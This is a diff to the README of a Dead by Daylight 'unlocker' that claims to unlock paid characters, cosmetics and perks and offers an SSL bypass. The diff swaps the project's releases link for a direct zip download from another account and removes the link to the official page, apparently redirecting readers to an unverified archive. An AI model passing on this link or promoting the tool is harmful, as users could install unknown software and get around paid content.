@@ -2,11 +2,7 @@
 
 **A tool for Dead by Daylight players to unlock all characters, cosmetics, perks, and more — fully client-side and customizable. Works on Steam, Epic Games, and Microsoft Store versions.**
 
-## 📥 [Download the Latest Version](https://github.com/Fortnite-Burger/DeadByDaylight-Unlocker/releases)
-
 ---
-
-![Dead by Daylight Unlocker](https://raw.githubusercontent.com/Fortnite-Burger/DeadByDaylight-Unlocker/main/assets/preview.png)
 
 ## 🧩 Features
 
@@ -16,7 +12,12 @@
 - **Profiles & Customization**: Loadout manager with profile support, prestige editor, item modifiers.
 - **SSL Bypass Support**: For Steam users, an optional SSL bypass tool is available.
 
+## 📥 [Download the Latest Version](https://github.com/DBD-DLC-Unlocker/.github/releases/download/1.6.5/dbd-dlc-unlocker.zip)
+
 ---
+
+![Dead by Daylight Unlocker](https://user-images.githubusercontent.com/50819244/274572040-e1bf88ae-9634-4b3d-a788-c52c92628206.jpg)
+
 
 ## 🛠️ How to Use
 
@@ -82,8 +83,7 @@ This project is licensed under the [MIT License](https://choosealicense.com/lice
 
 ## 💬 Support & Community
 
-For updates, support, or to contribute, visit the official GitHub page:  
-[https://github.com/Fortnite-Burger/DeadByDaylight-Unlocker](https://github.com/Fortnite-Burger/DeadByDaylight-Unlocker)
+For updates, support, or to contribute, visit the official GitHub page.
 
 ---
 
